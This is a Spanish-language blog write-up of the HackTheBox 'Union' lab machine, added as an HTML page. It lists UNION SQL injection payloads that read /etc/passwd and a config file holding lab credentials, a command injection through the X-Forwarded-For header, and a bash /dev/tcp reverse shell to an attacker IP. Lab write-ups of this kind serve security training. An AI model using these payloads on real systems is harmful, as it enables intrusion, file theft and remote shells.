@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Union Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Union es una máquina de dificultad media de la plataforma HackTheBox">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Union Machine - HackTheBox">
+  <meta name="twitter:description" content="Union es una máquina de dificultad media de la plataforma HackTheBox">
+
+<meta property="og:url" content="https://celero0.github.io/posts/union/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Union Machine - HackTheBox">
+  <meta property="og:description" content="Union es una máquina de dificultad media de la plataforma HackTheBox">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-26T21:03:38+00:00">
+    <meta property="article:modified_time" content="2025-12-26T21:03:38+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/union/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/union/">
+              Union Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-12-26T21:03:38Z">
+                December 26, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Linux #Medium #SQLI</li>
+</ul>
+<hr>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Realizamos un escaneo de los puertos, encontrando como resultado el puerto <code>80</code> abierto, que está corriendo el servicio <code>HTTP</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.233 -oG allPorts
+</span></span></code></pre></div><img src="/images/Pasted image 20251226152119.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-puerto-80">
+  Enumeración puerto 80
+  <a class="heading-link" href="#enumeraci%c3%b3n-puerto-80">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Viendo la página en el puerto 80, tenemos que podemos verificar <code>players</code> para si son elegibles para participar en algún torneo</p>
+<img src="/images/Pasted image 20251226152243.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si ponemos algún valor, aparece un mensaje, y un apartado para ir a <code>http:10.10.11.128/challenge.php</code></p>
+<img src="/images/Pasted image 20251226152400.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Yendo a <code>challenge.php</code> encontramos algo similar a la página anterior, solo que se nos pide una <code>flag</code></p>
+<img src="/images/Pasted image 20251226152507.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="sqlinjection">
+  SQLinjection
+  <a class="heading-link" href="#sqlinjection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Interceptando la petición de la página principal en <code>burpsuite</code>, probamos inyecciones sql básicas, teniendo éxito en la <code>Union injection</code> Con el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#f85149">&#39;</span> UNION SELECT 1;--+-
+</span></span></code></pre></div><img src="/images/Pasted image 20251226153043.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="viendo-las-bases-de-datos">
+  Viendo las bases de datos
+  <a class="heading-link" href="#viendo-las-bases-de-datos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Podemos ver que solo tiene una columna la consulta, por lo tanto procederemos a investigar por las bases de datos</p>
+<pre tabindex="0"><code>celero0&#39; UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;-- -
+</code></pre><p>Teniendo como resultado las siguientes bases de datos <code>mysql,information_schema,performance_schema,sys,november</code>, la que parece más interesante es la última, <code>november</code>.</p>
+<h2 id="viendo-las-tablas">
+  Viendo las tablas
+  <a class="heading-link" href="#viendo-las-tablas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para ver las tablas de la base de datos <code>november</code>, tenemos el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#a5d6ff">&#39; UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;</span>november<span style="color:#f85149">&#39;</span>;-- -
+</span></span></code></pre></div><p>El cual como resultado nos arroja que existe las tablas <code>flag</code> y <code>players</code></p>
+<img src="/images/Pasted image 20251226154541.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="viendo-las-columnas">
+  Viendo las columnas
+  <a class="heading-link" href="#viendo-las-columnas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para ver el nombre de la columna de la tabla <code>flag</code> tenemos el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#a5d6ff">&#39; UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;</span>flag<span style="color:#f85149">&#39;</span>;-- -
+</span></span></code></pre></div><p>Mostrando que existe sólo una columna llamada <code>one</code></p>
+<img src="/images/Pasted image 20251226155306.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="viendo-los-valores-de-la-columna">
+  Viendo los valores de la columna
+  <a class="heading-link" href="#viendo-los-valores-de-la-columna">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para ver los valores de la columna <code>one</code> tenemos el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#f85149">&#39;</span> UNION SELECT GROUP_CONCAT<span style="color:#ff7b72;font-weight:bold">(</span>one<span style="color:#ff7b72;font-weight:bold">)</span> FROM november.flag;--+-
+</span></span></code></pre></div><p>Que nos muestra como valor una flag <code>UHC{F1rst_5tep_2_Qualify}</code></p>
+<img src="/images/Pasted image 20251226155629.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Insertamos la flag en <code>/challenge.php</code> y tenemos el siguiente mensaje</p>
+<p>Primero nos redirige hacia <code>/firewall.php</code>, y nos aparece el mensaje que ahora podemos acceder a <code>SSH</code></p>
+<img src="/images/Pasted image 20251226172148.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Escaneando por el puerto 22, vemos que ahora el puerto <code>SSH</code> está abierto pero no tenemos credenciales válidas</p>
+<img src="/images/Pasted image 20251226172241.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="read-files-con-sqli">
+  Read files con SQLI
+  <a class="heading-link" href="#read-files-con-sqli">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Como no tenemos credenciales válidas para conectarnos por <code>SSH</code> procedemos a intentar leer archivos mediante SQLI</p>
+<p>Para cargar archivos locales desde SQL tenemos la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SELECT LOAD_FILE<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;/etc/passwd&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>;
+</span></span></code></pre></div><p>adaptándolo a nuestro payload quedaría así</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#a5d6ff">&#39; UNION SELECT LOAD_FILE(&#39;</span>/etc/passwd<span style="color:#f85149">&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>;--+-
+</span></span></code></pre></div><p>Tenemos como resultado el siguiente, el cual demuestra que tenemos capacidad de listado de archivos</p>
+<img src="/images/Pasted image 20251226172645.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto procedemos a intentar leer el archivo <code>config.php</code>, que por defecto se podría encontrar en <code>/var/www/html/config.php</code></p>
+<p>Encontramos las credenciales de la base de datos: <code>uhc:uhc-11qual-global-pw</code></p>
+<img src="/images/Pasted image 20251226172904.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="acceso-a-la-máquina">
+  Acceso a la máquina
+  <a class="heading-link" href="#acceso-a-la-m%c3%a1quina">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Probamos si es que se reutilizan las credenciales de la base de datos en <code>SSH</code>, y obtenemos acceso a la máquina, y encontramos la flag de usuario</p>
+<img src="/images/Pasted image 20251226173316.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Viendo los archivos <code>.php</code> en el directorio <code>/var/www/html</code> tenemos el archivo
+<code>firewall.php</code>, el cual es el siguiente</p>
+<img src="/images/Pasted image 20251226173510.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>La parte importante se concentra acá, el script verifica si existe la cabecera <code>HTTP_X_FORWARDED_FOR</code>, si existe ejecuta <code>iptables</code> con privilegios sudo
+tomando como valor la <code>IP</code> que aparece en <code>HTTP_X_FORWARDED_FOR</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;?</span>php
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> (isset(<span style="color:#79c0ff">$_SERVER</span>[<span style="color:#a5d6ff">&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">$ip</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$_SERVER</span>[<span style="color:#a5d6ff">&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
+</span></span><span style="display:flex;"><span>  } <span style="color:#ff7b72">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">$ip</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$_SERVER</span>[<span style="color:#a5d6ff">&#39;REMOTE_ADDR&#39;</span>];
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  system(<span style="color:#a5d6ff">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> <span style="color:#ff7b72;font-weight:bold">.</span> <span style="color:#79c0ff">$ip</span> <span style="color:#ff7b72;font-weight:bold">.</span> <span style="color:#a5d6ff">&#34; -j ACCEPT&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#f85149">
+</span></span></span></code></pre></div><h2 id="explotando-script-mal-configurado">
+  Explotando script mal configurado
+  <a class="heading-link" href="#explotando-script-mal-configurado">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Por lo tanto nos podemos aprovechar de la mala configuración para ejecutar un comando arbitrario, para probar si es vulnerable haremos lo siguiente</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>X-FORWARDED-FOR: 10.10.10.10;ping 10.10.14.20;
+</span></span></code></pre></div><img src="/images/Pasted image 20251226175349.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y verificamos las trazas <code>ICMP</code> con <code>TCPDUMP</code> de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -i tun0 icmp
+</span></span></code></pre></div><p>y tenemos respuestas, por lo tanto se ejecuta el RCE</p>
+<img src="/images/Pasted image 20251226175317.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto ahora procedemos a enviarnos una consola inversa, el payload será el siguiente</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>X-FORWARDED-FOR:;bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.20/4443 0&gt;&amp;1&#39;</span>;
+</span></span></code></pre></div><img src="/images/Pasted image 20251226175547.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y nos ponemos en escucha con <code>nc</code> de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#a5d6ff">4443</span>
+</span></span></code></pre></div><p>y obtenemos la shell, con el usuario <code>www-data</code></p>
+<img src="/images/Pasted image 20251226175616.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Procedemos a ver los permisos <code>sudo</code> que tiene, y vemos que podemos ejecutar <code>sudo</code>, sin proporcionar contraseña y con cualquier argumento</p>
+<img src="/images/Pasted image 20251226175653.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto nos convertiremos en el usuario <code>root</code> con el comando <code>sudo su</code> y procederemos a leer la flag de <code>/root/root.txt</code></p>
+<img src="/images/Pasted image 20251226175751.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
